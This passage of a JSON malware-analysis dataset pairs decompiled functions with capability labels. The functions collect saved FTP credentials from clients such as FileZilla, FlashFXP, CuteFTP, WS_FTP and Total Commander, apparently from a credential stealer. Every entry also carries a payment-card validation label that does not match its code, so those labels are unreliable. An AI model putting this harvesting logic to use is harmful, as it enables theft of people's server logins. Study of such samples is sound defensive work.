        "decompiled_code": "\nint32_t __cdecl fcn.00401fb9(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.004106a0(arg_8h, 0, 0);\n    if (arg_8h_00 != 0) {\n        iVar1 = arg_8h_00;\n        iVar2 = arg_8h_00;\n        arg_8h_00 = fcn.004018cf(arg_8h_00);\n        iVar1 = fcn.004106a0(arg_8h, arg_8h_00, iVar1, iVar2);\n        if (iVar1 == 0) {\n            fcn.004018b8(arg_8h_00);\n            arg_8h_00 = 0;\n        }\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 215
    },
    "00402497": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402497(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.004018cf(arg_ch + 0x1000);\n    fcn.00401906(arg_8h, arg_ch_00, arg_ch);\n    fcn.00402e72(arg_ch_00, arg_ch, arg_10h);\n    fcn.004018b8(arg_ch_00);\n    return;\n}\n",
        "token_count": 123
    },
    "0040262a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040262a(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t *unaff_ESI;\n    \n    iVar2 = 4;\n    uVar3 = 0;\n    do {\n        uVar1 = *unaff_ESI;\n        uVar4 = uVar3;\n        if (uVar1 == 0x2b) {\n            uVar4 = uVar3 + 0x3e;\n        }\n        if (uVar1 == 0x2f) {\n            uVar4 = uVar4 + 0x3f;\n        }\n        if (('/' < uVar1) && (uVar1 < ':')) {\n            uVar1 = uVar1 + 4;\n            uVar4 = uVar4 + uVar1;\n        }\n        if (('@' < uVar1) && (uVar1 < '[')) {\n            uVar1 = uVar1 + 0xbf;\n            uVar4 = uVar4 + uVar1;\n        }\n        if (('`' < uVar1) && (uVar1 < '{')) {\n            uVar4 = uVar4 + (uVar1 + 0xb9);\n        }\n        uVar3 = uVar4 << 6 | uVar4 >> 0x1a;\n        iVar2 = iVar2 + -1;\n        unaff_ESI = unaff_ESI + 1;\n    } while (iVar2 != 0);\n    return ((uVar4 & 0xff0000) >> 8 | (uVar4 & 0xff00) << 8 | uVar4 << 0x18) >> 8;\n}\n",
        "token_count": 390
    },
    "004026dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004026dd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_114h;\n    uint var_10dh;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar4 = 0;\n    iVar1 = fcn.004107d2(*0x414869, \"Software\\\\WinRAR\", &var_4h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.004107d8(var_4h, arg_8h, 0, 3, arg_ch, arg_10h);\n        uVar4 = iVar1 == 0;\n        fcn.004107c0(var_4h);\n    }\n    if (((uVar4 == 0) && (uVar2 = fcn.004106ca(0x104, &var_10dh),  uVar2 != 0)) && (uVar2 < 0x105)) {\n        fcn.004106d0(&var_10dh, 0);\n        iVar1 = fcn.004025a9(&var_10dh);\n        if (iVar1 == 0) {\n            uVar3 = fcn.00401df8(&var_10dh, 0x414845);\n            uVar3 = fcn.00401e4c(uVar3, arg_8h);\n        }\n        else {\n            uVar3 = fcn.00401df8(&var_10dh, arg_8h);\n        }\n        var_8h = fcn.00410652(uVar3, 0xc0000000, 3, 0, 2, 0, 0);\n        if (var_8h != -1) {\n            uVar4 = fcn.00401422(var_8h, arg_ch, arg_10h);\n            fcn.0041065e(var_8h);\n        }\n        if (uVar4 == 0) {\n            fcn.004106d6(uVar3);\n        }\n        fcn.004018b8(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 505
    },
    "00403510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "hash data using SHA1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403510(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = arg_ch;\n    *0x418d40 = 0x67452301;\n    *0x418d44 = 0xefcdab89;\n    *0x418d48 = 0x98badcfe;\n    *0x418d4c = 0x10325476;\n    *0x418d50 = 0xc3d2e1f0;\n    while( true ) {\n        if (var_8h < 0x40) break;\n        fcn.00401906(arg_8h + var_4h, 0x418d54, 0x40);\n        var_4h = var_4h + 0x40;\n        fcn.00403642();\n        var_8h = var_8h - 0x40;\n    }\n    fcn.00401906(arg_8h + var_4h, 0x418d54, var_8h);\n    *(var_8h + 0x418d54) = 0x80;\n    iVar2 = var_8h - 0x37;\n    if (var_8h < 0x37 || iVar2 == 0) {\n        if (iVar2 == 0) goto code_r0x004035ca;\n    }\n    else {\n        iVar2 = var_8h - 0x3f;\n        if (iVar2 != 0) {\n            do {\n                *(iVar2 + 0x418d94) = 0;\n                iVar2 = iVar2 + 1;\n            } while (iVar2 < 0);\n        }\n        fcn.00403642();\n        iVar2 = -0x38;\n    }\n    do {\n        *(iVar2 + 0x418d8c) = 0;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0);\ncode_r0x004035ca:\n    uVar1 = arg_ch * 8;\n    *0x418d90 = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\n    *0x418d8c = (arg_ch * 8 >> 0x20) << 0x18;\n    fcn.00403642();\n    *0x418d40 = *0x418d40 >> 0x18 | (*0x418d40 & 0xff0000) >> 8 | (*0x418d40 & 0xff00) << 8 | *0x418d40 << 0x18;\n    *0x418d44 = *0x418d44 >> 0x18 | (*0x418d44 & 0xff0000) >> 8 | (*0x418d44 & 0xff00) << 8 | *0x418d44 << 0x18;\n    *0x418d48 = *0x418d48 >> 0x18 | (*0x418d48 & 0xff0000) >> 8 | (*0x418d48 & 0xff00) << 8 | *0x418d48 << 0x18;\n    *0x418d4c = *0x418d4c >> 0x18 | (*0x418d4c & 0xff0000) >> 8 | (*0x418d4c & 0xff00) << 8 | *0x418d4c << 0x18;\n    *0x418d50 = *0x418d50 >> 0x18 | (*0x418d50 & 0xff0000) >> 8 | (*0x418d50 & 0xff00) << 8 | *0x418d50 << 0x18;\n    fcn.00401906(0x418d40, arg_10h, 0x14);\n    return;\n}\n",
        "token_count": 954
    },
    "00403642": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "hash data using SHA1"
        ],
        "decompiled_code": "\nvoid fcn.00403642(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar3 = -8;\n    do {\n        uVar1 = *(iVar3 * 8 + 0x418d94);\n        uVar5 = *(iVar3 * 8 + 0x418d98);\n        *(iVar3 * 8 + 0x418d94) = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\n        *(iVar3 * 8 + 0x418d98) = uVar5 >> 0x18 | (uVar5 & 0xff0000) >> 8 | (uVar5 & 0xff00) << 8 | uVar5 << 0x18;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0);\n    iVar3 = -0x40;\n    do {\n        uVar1 = *(iVar3 * 4 + 0x418e88) ^ *(iVar3 * 4 + 0x418e5c) ^ *(iVar3 * 4 + 0x418e74) ^ *(iVar3 * 4 + 0x418e54);\n        *(iVar3 * 4 + 0x418e94) = uVar1 << 1 | uVar1 < 0;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0);\n    var_4h = *0x418d4c;\n    var_8h = *0x418d50;\n    iVar3 = -0x14;\n    uVar1 = *0x418d40;\n    uVar5 = *0x418d44;\n    uVar4 = *0x418d48;\n    do {\n        uVar7 = uVar4;\n        uVar6 = uVar1;\n        iVar2 = (uVar7 & uVar5 | ~uVar5 & var_4h) + *(iVar3 * 4 + 0x418da4) + var_8h;\n        var_8h = var_4h;\n        uVar4 = uVar5 << 0x1e | uVar5 >> 2;\n        uVar1 = (uVar6 << 5 | uVar6 >> 0x1b) + iVar2 + 0x5a827999;\n        iVar3 = iVar3 + 1;\n        uVar5 = uVar6;\n        var_4h = uVar7;\n    } while (iVar3 != 0);\n    iVar3 = -0x14;\n    do {\n        uVar7 = uVar4;\n        uVar5 = uVar1;\n        iVar2 = (uVar6 ^ var_4h ^ uVar7) + *(iVar3 * 4 + 0x418df4) + var_8h;\n        var_8h = var_4h;\n        uVar4 = uVar6 << 0x1e | uVar6 >> 2;\n        uVar1 = (uVar5 << 5 | uVar5 >> 0x1b) + iVar2 + 0x6ed9eba1;\n        iVar3 = iVar3 + 1;\n        uVar6 = uVar5;\n        var_4h = uVar7;\n    } while (iVar3 != 0);\n    iVar3 = -0x14;\n    do {\n        uVar7 = uVar4;\n        uVar6 = uVar1;\n        iVar2 = ((uVar7 | var_4h) & uVar5 | var_4h & uVar7) + *(iVar3 * 4 + 0x418e44) + var_8h;\n        var_8h = var_4h;\n        uVar4 = uVar5 << 0x1e | uVar5 >> 2;\n        uVar1 = (uVar6 << 5 | uVar6 >> 0x1b) + iVar2 + -0x70e44324;\n        iVar3 = iVar3 + 1;\n        uVar5 = uVar6;\n        var_4h = uVar7;\n    } while (iVar3 != 0);\n    iVar3 = -0x14;\n    do {\n        var_4h = uVar7;\n        uVar7 = uVar4;\n        uVar5 = uVar1;\n        iVar2 = (uVar6 ^ var_4h ^ uVar7) + *(iVar3 * 4 + 0x418e94) + var_8h;\n        var_8h = var_4h;\n        uVar4 = uVar6 << 0x1e | uVar6 >> 2;\n        uVar1 = (uVar5 << 5 | uVar5 >> 0x1b) + iVar2 + -0x359d3e2a;\n        iVar3 = iVar3 + 1;\n        uVar6 = uVar5;\n    } while (iVar3 != 0);\n    *0x418d40 = *0x418d40 + uVar1;\n    *0x418d44 = *0x418d44 + uVar5;\n    *0x418d48 = *0x418d48 + uVar4;\n    *0x418d4c = *0x418d4c + uVar7;\n    *0x418d50 = *0x418d50 + var_4h;\n    return;\n}\n",
        "token_count": 1292
    },
    "00403930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403930(uint arg_8h, int32_t *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    iVar3 = 0;\n    iVar1 = fcn.004038d0(arg_8h, 0x5a);\n    do {\n        if (iVar1 == 0) {\n            return iVar3;\n        }\n        iVar1 = fcn.004038d0(arg_8h, 0x5a);\n        if (iVar1 == 0) {\n            return iVar3;\n        }\n        iVar1 = fcn.00410856(arg_8h, &var_1h, 1, 0);\n        if (iVar1 < 1) {\n            return iVar3;\n        }\n        if (var_1h == arg_14h) {\n            iVar3 = 1;\n        }\n        (**(*arg_ch + 0x10))(arg_ch, &var_1h, 1, 0);\n        uVar2 = fcn.00401082(arg_ch);\n        iVar1 = iVar3;\n    } while (uVar2 < arg_10h);\n    return iVar3;\n}\n",
        "token_count": 317
    },
    "00403db7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403db7(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    var_4h._0_2_ = 1;\n    var_4h._2_2_ = 0x1e;\n    fcn.0041085c(arg_8h, 0xffff, 0x80, &var_4h, 4);\n    return;\n}\n",
        "token_count": 102
    },
    "00403ffb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403ffb(void)\n\n{\n    uint var_18eh;\n    \n    fcn.00410862(0x101, &var_18eh);\n    return;\n}\n",
        "token_count": 41
    },
    "0040456c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040456c(void)\n\n{\n    int32_t iVar1;\n    uint arg_10h;\n    char *in_stack_ffffff64;\n    uint32_t var_78h;\n    uint var_74h;\n    uint var_10h;\n    ushort var_ch;\n    ushort var_ah;\n    uchar var_8h;\n    uchar var_7h;\n    uchar var_6h;\n    uchar var_5h;\n    uchar var_4h;\n    uchar var_3h;\n    uchar var_2h;\n    uint var_1h;\n    \n    iVar1 = fcn.004027f7(\"HWID\", &var_78h);\n    if ((iVar1 == 0) || (var_78h < 0x15)) {\n        iVar1 = fcn.00410796(&var_10h, iVar1);\n        if (-1 < iVar1) {\n            fcn.004107ae(&var_74h, 0x414f97, var_10h, var_ch, var_ah, var_8h, var_7h, var_6h, var_5h, var_4h, var_3h, \n                         var_2h, var_1h);\n            arg_10h = fcn.0041066a(&var_74h);\n            in_stack_ffffff64 = \"HWID\";\n            fcn.004026dd(\"HWID\", &var_74h, arg_10h);\n        }\n    }\n    fcn.004018b8(in_stack_ffffff64);\n    return;\n}\n",
        "token_count": 371
    },
    "00404a95": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404a95(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 1, 0);\n    fcn.0040491b(arg_8h, \"Software\\\\Far\\\\Plugins\\\\FTP\\\\Hosts\");\n    fcn.0040491b(arg_8h, \"Software\\\\Far2\\\\Plugins\\\\FTP\\\\Hosts\");\n    fcn.0040491b(arg_8h, \"Software\\\\Far Manager\\\\Plugins\\\\FTP\\\\Hosts\");\n    fcn.0040480d(arg_8h, \"Software\\\\Far\\\\SavedDialogHistory\\\\FTPHost\");\n    fcn.0040480d(arg_8h, \"Software\\\\Far2\\\\SavedDialogHistory\\\\FTPHost\");\n    fcn.0040480d(arg_8h, \"Software\\\\Far Manager\\\\SavedDialogHistory\\\\FTPHost\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 226
    },
    "00404c51": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather total-commander information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c51(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 2, 0);\n    uVar1 = fcn.004018cf(0x105);\n    uVar2 = fcn.0041073c(uVar1, 0x104);\n    if ((uVar2 == 0) || (0x104 < uVar2)) {\n        fcn.004018b8(uVar1);\n    }\n    else {\n        fcn.00404b1e(arg_8h, uVar1);\n    }\n    uVar1 = fcn.00401eb1(0x28);\n    fcn.00404b1e(arg_8h, uVar1);\n    iVar3 = fcn.00401eb1(0x1a);\n    if (iVar3 != 0) {\n        uVar1 = fcn.00401e4c(iVar3, \"\\\\GHISLER\");\n        fcn.00404b1e(arg_8h, uVar1);\n    }\n    iVar3 = fcn.00401eb1(0x23);\n    if (iVar3 != 0) {\n        uVar1 = fcn.00401e4c(iVar3, \"\\\\GHISLER\");\n        fcn.00404b1e(arg_8h, uVar1);\n    }\n    iVar3 = fcn.00401eb1(0x1c);\n    if (iVar3 != 0) {\n        uVar1 = fcn.00401e4c(iVar3, \"\\\\GHISLER\");\n        fcn.00404b1e(arg_8h, uVar1);\n    }\n    uVar1 = fcn.00401d71(*0x414869, \"Software\\\\Ghisler\\\\Windows Commander\", \"InstallDir\", 0);\n    fcn.00404b1e(arg_8h, uVar1);\n    iVar3 = fcn.00401d71(*0x414869, \"Software\\\\Ghisler\\\\Windows Commander\", \"FtpIniName\", 0);\n    if (iVar3 != 0) {\n        fcn.00404b07(arg_8h, iVar3);\n        fcn.004018b8(iVar3);\n    }\n    uVar1 = fcn.00401d71(*0x414869, \"Software\\\\Ghisler\\\\Total Commander\", \"InstallDir\", 0);\n    fcn.00404b1e(arg_8h, uVar1);\n    iVar3 = fcn.00401d71(*0x414869, \"Software\\\\Ghisler\\\\Total Commander\", \"FtpIniName\", 0);\n    if (iVar3 != 0) {\n        fcn.00404b07(arg_8h, iVar3);\n        fcn.004018b8(iVar3);\n    }\n    uVar1 = fcn.00401d71(0x80000002, \"Software\\\\Ghisler\\\\Windows Commander\", \"InstallDir\", 0);\n    fcn.00404b1e(arg_8h, uVar1);\n    iVar3 = fcn.00401d71(0x80000002, \"Software\\\\Ghisler\\\\Windows Commander\", \"FtpIniName\", 0);\n    if (iVar3 != 0) {\n        fcn.00404b07(arg_8h, iVar3);\n        fcn.004018b8(iVar3);\n    }\n    uVar1 = fcn.00401d71(0x80000002, \"Software\\\\Ghisler\\\\Total Commander\", \"InstallDir\", 0);\n    fcn.00404b1e(arg_8h, uVar1);\n    iVar3 = fcn.00401d71(0x80000002, \"Software\\\\Ghisler\\\\Total Commander\", \"FtpIniName\", 0);\n    if (iVar3 != 0) {\n        fcn.00404b07(arg_8h, iVar3);\n        fcn.004018b8(iVar3);\n    }\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 961
    },
    "00404fff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404fff(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    arg_8h_00 = fcn.00401eb1(arg_ch);\n    if (arg_8h_00 != 0) {\n        fcn.00401df8(arg_8h_00, arg_10h);\n        fcn.004018b8(arg_8h_00);\n        var_4h = arg_8h_00;\n    }\n    fcn.00404e73(arg_8h, var_4h, 1);\n    fcn.004018b8(var_4h);\n    return;\n}\n",
        "token_count": 177
    },
    "0040504b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather ws-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040504b(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint arg_ch;\n    uint var_110h;\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 3, 0);\n    uVar1 = fcn.0041073c(&var_109h, 0x104);\n    if ((uVar1 != 0) && (uVar1 < 0x105)) {\n        uVar2 = fcn.00401df8(&var_109h, \"\\\\win.ini\");\n        iVar3 = fcn.00410742(\"WS_FTP\", 0x4151a3, 0x414847, &var_109h, 0x104, uVar2);\n        if (iVar3 != 0) {\n            fcn.00404e73(arg_8h, &var_109h, 0);\n        }\n        iVar3 = fcn.00410742(\"WS_FTP\", \"DEFDIR\", 0x414847, &var_109h, 0x104, uVar2);\n        if (iVar3 != 0) {\n            fcn.00404e73(arg_8h, &var_109h, 0);\n        }\n        fcn.004018b8(uVar2);\n    }\n    iVar3 = fcn.00401eb1(0x2b);\n    if (iVar3 != 0) {\n        arg_ch = fcn.00401e4c(iVar3, \"\\\\Ipswitch\\\\WS_FTP\");\n        uVar2 = arg_8h;\n        fcn.00404e73(arg_8h, arg_ch, 0);\n        fcn.004018b8(uVar2);\n    }\n    fcn.00404fff(arg_8h, 0x1a, \"\\\\Ipswitch\");\n    fcn.00404fff(arg_8h, 0x23, \"\\\\Ipswitch\");\n    fcn.00404fff(arg_8h, 0x1c, \"\\\\Ipswitch\");\n    fcn.00401636(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 507
    },
    "00405199": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405199(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    arg_ch_00 = fcn.00401d71(*0x414869, arg_ch, \"QCHistory\", &var_4h);\n    if (arg_ch_00 != 0) {\n        fcn.00404017(arg_8h, arg_ch_00, var_4h, 0xbeef0001);\n        fcn.004018b8(arg_ch_00);\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0040531a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather cuteftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040531a(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401eb1(arg_ch);\n    if (arg_8h_00 != 0) {\n        uVar1 = fcn.00401df8(arg_8h_00, \"\\\\GlobalSCAPE\\\\CuteFTP\");\n        uVar2 = arg_8h;\n        fcn.004051e3(arg_8h, uVar1, \"\\\\sm.dat\");\n        fcn.004018b8(uVar2);\n        uVar1 = fcn.00401df8(arg_8h_00, \"\\\\GlobalSCAPE\\\\CuteFTP Pro\");\n        uVar2 = arg_8h;\n        fcn.004051e3(arg_8h, uVar1, \"\\\\sm.dat\");\n        fcn.004018b8(uVar2);\n        uVar1 = fcn.00401df8(arg_8h_00, \"\\\\GlobalSCAPE\\\\CuteFTP Lite\");\n        uVar2 = arg_8h;\n        fcn.004051e3(arg_8h, uVar1, \"\\\\sm.dat\");\n        fcn.004018b8(uVar2);\n        uVar2 = fcn.00401df8(arg_8h_00, \"\\\\CuteFTP\");\n        fcn.004051e3(arg_8h, uVar2, \"\\\\sm.dat\");\n        fcn.004018b8(arg_8h);\n        fcn.004018b8(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "004054c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather flashfxp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004054c8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401d71(arg_ch, arg_10h, arg_14h, 0);\n    if (arg_8h_00 != 0) {\n        uVar1 = fcn.00401df8(arg_8h_00, \"\\\\Sites.dat\");\n        fcn.004054a5(arg_8h, uVar1, 0xbeef0000);\n        uVar1 = fcn.00401df8(arg_8h_00, \"\\\\Quick.dat\");\n        fcn.004054a5(arg_8h, uVar1, 0xbeef0001);\n        uVar1 = fcn.00401df8(arg_8h_00, 0x4153c4);\n        fcn.004054a5(arg_8h, uVar1, 0xbeef0002);\n        fcn.004018b8(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "0040558d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather flashfxp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040558d(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.00401eb1(arg_ch);\n    if (arg_ch_00 != 0) {\n        fcn.00405542(arg_8h, arg_ch_00, \"\\\\Sites.dat\", 0xbeef0000);\n        fcn.00405542(arg_8h, arg_ch_00, \"\\\\Quick.dat\", 0xbeef0001);\n        fcn.00405542(arg_8h, arg_ch_00, 0x4153c4, 0xbeef0002);\n        fcn.004018b8(arg_ch_00);\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "004055ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather flashfxp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004055ed(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 5, 0);\n    fcn.004054c8(arg_8h, *0x414869, \"Software\\\\FlashFXP\\\\3\", \"InstallerDathPath\");\n    fcn.004054c8(arg_8h, *0x414869, \"Software\\\\FlashFXP\", \"path\");\n    fcn.004054c8(arg_8h, *0x414869, \"Software\\\\FlashFXP\\\\3\", \"Install Path\");\n    fcn.004054c8(arg_8h, *0x414869, \"Software\\\\FlashFXP\\\\3\", \"DataFolder\");\n    fcn.004054c8(arg_8h, *0x414869, \"Software\\\\FlashFXP\\\\4\", \"InstallerDathPath\");\n    fcn.004054c8(arg_8h, *0x414869, \"Software\\\\FlashFXP\\\\4\", \"path\");\n    fcn.004054c8(arg_8h, *0x414869, \"Software\\\\FlashFXP\\\\4\", \"Install Path\");\n    fcn.004054c8(arg_8h, *0x414869, \"Software\\\\FlashFXP\\\\4\", \"DataFolder\");\n    fcn.004054c8(arg_8h, 0x80000002, \"Software\\\\FlashFXP\\\\3\", \"InstallerDathPath\");\n    fcn.004054c8(arg_8h, 0x80000002, \"Software\\\\FlashFXP\", \"path\");\n    fcn.004054c8(arg_8h, 0x80000002, \"Software\\\\FlashFXP\\\\3\", \"Install Path\");\n    fcn.004054c8(arg_8h, 0x80000002, \"Software\\\\FlashFXP\\\\3\", \"DataFolder\");\n    fcn.004054c8(arg_8h, 0x80000002, \"Software\\\\FlashFXP\\\\4\", \"InstallerDathPath\");\n    fcn.004054c8(arg_8h, 0x80000002, \"Software\\\\FlashFXP\\\\4\", \"path\");\n    fcn.004054c8(arg_8h, 0x80000002, \"Software\\\\FlashFXP\\\\4\", \"Install Path\");\n    fcn.004054c8(arg_8h, 0x80000002, \"Software\\\\FlashFXP\\\\4\", \"DataFolder\");\n    fcn.0040558d(arg_8h, 0x1a);\n    fcn.0040558d(arg_8h, 0x23);\n    fcn.0040558d(arg_8h, 0x1c);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 647
    },
    "004059a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "gather filezilla information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004059a4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00405844(arg_8h, arg_ch, 0x41546a, 0x415460, 0x415465, 0x41546f, 0x415474, \"Server Type\", 0xbeef0013);\n    fcn.00405844(arg_8h, arg_ch, \"Server.Pass\", \"Server.Host\", \"Server.User\", \"Server.Port\", 0x4154bb, 0x4154c0, \n                 0xbeef0013);\n    fcn.00405844(arg_8h, arg_ch, \"Last Server Pass\", \"Last Server Host\", \"Last Server User\", \"Last Server Port\", \n                 \"Last Server Path\", \"Last Server Type\", 0xbeef0014);\n    iVar1 = fcn.004107c6(*0x414869, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401df8(arg_ch, 0x414845);\n            uVar2 = fcn.00401e4c(uVar2, &var_80ch);\n            fcn.004059a4(arg_8h, uVar2);\n            fcn.004018b8(uVar2);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 460
    },
    "00405acb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather filezilla information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405acb(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 6, 0);\n    fcn.004059a4(arg_8h, \"Software\\\\FileZilla\");\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\FileZilla\", \"Install_Dir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.004057a7(arg_8h, iVar1);\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\FileZilla Client\", 0x414847, 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.004057a7(arg_8h, iVar1);\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(0x80000002, \"Software\\\\FileZilla\", \"Install_Dir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.004057a7(arg_8h, iVar1);\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(0x80000002, \"Software\\\\FileZilla Client\", 0x414847, 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.004057a7(arg_8h, iVar1);\n        